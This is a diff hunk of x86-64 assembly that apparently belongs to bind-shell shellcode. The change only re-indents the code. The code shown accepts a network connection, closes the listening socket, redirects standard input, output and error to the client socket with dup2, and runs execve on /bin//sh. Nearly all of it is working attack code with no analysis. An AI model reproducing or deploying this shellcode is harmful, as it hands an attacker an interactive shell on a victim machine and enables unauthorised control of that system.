@@ -64,77 +64,77 @@ _start:
     pop rax
 	sub rsp, 16
 	mov rsi, rsp
-        mov byte [rsp-1], 16
-        sub rsp, 1
-        mov rdx, rsp
+    mov byte [rsp-1], 16
+    sub rsp, 1
+    mov rdx, rsp
 
-        syscall
+    syscall
 
 	; store the client socket description 
 	mov r9, rax 
 
-        ; close parent
+    ; close parent
 
-        push 3
-        pop rax
-        syscall
+    push 3
+    pop rax
+    syscall
 
-        ; duplicate sockets
+    ; duplicate sockets
 
-        ; dup2 (new, old)
-        mov rdi, r9
-        push 33
-        pop rax
-        xor rsi, rsi
-        syscall
+    ; dup2 (new, old)
+    mov rdi, r9
+    push 33
+    pop rax
+    xor rsi, rsi
+    syscall
 
-        push 33
-        pop rax
-        push 1
-        pop rsi
-        syscall
+    push 33
+    pop rax
+    push 1
+    pop rsi
+    syscall
 
-        push 33
-        pop rax
-        push 2
-        pop rsi
-        syscall
-
-
-
-        ; execve
-
-        ; First NULL push
-
-        xor rax, rax
-        push rax
-
-        ; push /bin//sh in reverse
-
-        mov rbx, 0x68732f2f6e69622f
-        push rbx
-
-        ; store /bin//sh address in RDI
-
-        mov rdi, rsp
-
-        ; Second NULL push
-        push rax
-
-        ; set RDX
-        mov rdx, rsp
+    push 33
+    pop rax
+    push 2
+    pop rsi
+    syscall
 
 
-        ; Push address of /bin//sh
-        push rdi
 
-        ; set RSI
+    ; execve
 
-        mov rsi, rsp
+    ; First NULL push
 
-        ; Call the Execve syscall
-        add rax, 59
-        syscall
+    xor rax, rax
+    push rax
+
+    ; push /bin//sh in reverse
+
+    mov rbx, 0x68732f2f6e69622f
+    push rbx
+
+    ; store /bin//sh address in RDI
+
+    mov rdi, rsp
+
+    ; Second NULL push
+    push rax
+
+    ; set RDX
+    mov rdx, rsp
+
+
+    ; Push address of /bin//sh
+    push rdi
+
+    ; set RSI
+
+    mov rsi, rsp
+
+    ; Call the Execve syscall
+    add rax, 59
+    syscall
 
 
 
